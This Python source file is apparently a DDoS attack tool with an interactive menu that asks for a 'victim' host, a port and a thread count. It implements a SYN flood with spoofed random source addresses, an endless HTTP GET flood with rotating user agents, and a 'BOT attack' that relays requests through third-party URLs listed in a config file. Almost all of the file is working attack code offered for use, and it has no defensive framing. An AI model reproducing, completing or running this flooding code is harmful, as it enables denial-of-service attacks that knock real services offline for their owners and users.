import os , socket , threading , time , sys , random , urllib.request
from scapy.all import *
class client(object):
    
    def read(self , message):
        return input(f"{message} -> ")

    def puts(self , message):
        return print(message)

    def system(self , message):
        return os.system(message)

    

    def GETAttack(self , target , port , userAgents):
        while True:
            try:
                data = b"""Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-us,en;q=0.5
        Accept-Encoding: gzip,deflate
        Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
        Keep-Alive: 115
        Connection: keep-alive"""
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
                s.connect((target, port))
                
                s.sendall(b"GET / HTTP/1.1\r\nHost: " + (target).encode("""utf-8""") + b"\r\n\r\n User-Agent: "
                
                + random.choice(userAgents).encode("""utf-8""") + b"\r\n\r\n" + data)
                
                if s.recv == 4048:
                    print(f"\033[92m[+] GET Request Sent Successfully\033[0m")
                else:
                    print(f"\033[91m[-] Failed to Send GET Request!\033[0m")
                s.close()
                time.sleep(0.009)
            except Exception as e:
                print(f"\033[91m[-] Failed to Send GET Request!\033[0m {e}")


    def SYNAttack(self , target , port):
        while (True):
            try:
                networkLayer = IP(src=".".join(map(str, (random.randint(0,255)for _ in range(4))))
                , dst=target)
                
                transportLayer = TCP(sport=random.randint(1000,9000),dport=port,flags="S")
                
                send(networkLayer/transportLayer, verbose=False)
                
                print(f"\033[92m[+] SYN Package Sent!\033[0m")
                
                time.sleep(0.009)
            except Exception as e :
                print(f"\033[91m[-] An Error Occurred While Sending SYN Package!\033[0m {e}")


    def BOTAttack(self , host , userAgents):
        bots = []
        file = open("./config/bots.txt","r")
        
        for i in file.readlines():
            bots.append(i)
        file.close()
        
        while True:
            try:
                url = random.choice(bots).replace("""\n""","""""") + host
                response = urllib.request.urlopen(urllib.request.Request(url,headers={"""User-Agent""": random.choice(userAgents)}))
                if (response.read()):
                    print (f"\033[92m[+] BOT Attack Successful!\033[0m")
                else:
                    print (f"\033[91m[-] BOT Attack Failed!\033[0m")
                time.sleep(0.09)
            except:
                print (f"\033[91m[-] BOT Attack Failed!\033[0m")




    def ParseArg(self):
        threadNumber = 0
        syn = False
        get = False
        bot = False
        port = 0
        host = "NONE"

        print("""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡾⠿⢿⡀⠀⠀⠀⠀⣠⣶⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣦⣴⣿⡋⠀⠀⠈⢳⡄⠀⢠⣾⣿⠁⠈⣿⡆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠿⠛⠉⠉⠁⠀⠀⠀⠹⡄⣿⣿⣿⠀⠀⢹⡇⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⢻⣿⣿⡆⠀⠸⣿⠀⠀⠀
⠀⠀⠀⢀⣴⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣆⠹⣿⣷⠀⢘⣿⠀⠀⠀
⠀⠀⢀⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⠋⠉⠛⠂⠹⠿⣲⣿⣿⣧⠀⠀
⠀⢠⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⣿⣷⣾⣿⡇⢀⠀⣼⣿⣿⣿⣧⠀
⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢿⣿⣿⣿⠀
⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣷⡈⠿⢿⣿⡆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠁⢙⠛⣿⣿⣿⣿⡟⠀⡿⠀⠀⢀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣤⣉⣛⠻⠇⢠⣿⣾⣿⡄⢻⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣦⣤⣾⣿⣿⣿⣿⣆⠁


            * Developed by CryonicX 
            * Discord : cryonicx#0044
            * The faster your internet is, the more efficiency you will get :) 

        """)




        host_input = input(f"Enter Victim -> ")


        host = host_input


        host_input = input(f"Enter Port -> ")


        port = int(host_input)


        thread_input = input(f"Enter Thread -> ")


        threadNumber = int(thread_input)
        print("")
        print(f"\033[92mStarting...\033[0m")
        time.sleep(1)

        print("""
---------------------------------------
Enter Attack Type

1: SYN Overflow Attack
2: Get Attack
3: BOT Attack
4: Mixed Attack
---------------------------------------
        """)


        syn_input = input("Enter the attack type -> ").lower()

        
        if syn_input == "1":
            syn = True

        elif syn_input == "2":
            get = True

        elif syn_input == "3":
            bot = True

        elif syn_input == "4":
            syn = True
            get = True
            bot = True

        else:
            print("No such option was found.")



        if host == "NONE":
            print (f"\033[91m[-] Victim not found!\033[0m")
            exit()

        if port == 0:
            print (f"\033[91m[-] Port not found!\033[0m")
            exit()

        if bot == False and syn == False and bot == False:
            print (f"\033[93m[?] No attack method specified. Using GET Method!\033[0m")
            get = True

        if (threadNumber == 0):
            print (f"\033[93m[?] Number of cores not determined. 1 core is unlocked for each method!\033[0m")
            threadNumber = 1

        return [host,port,threadNumber,get,syn,bot]



      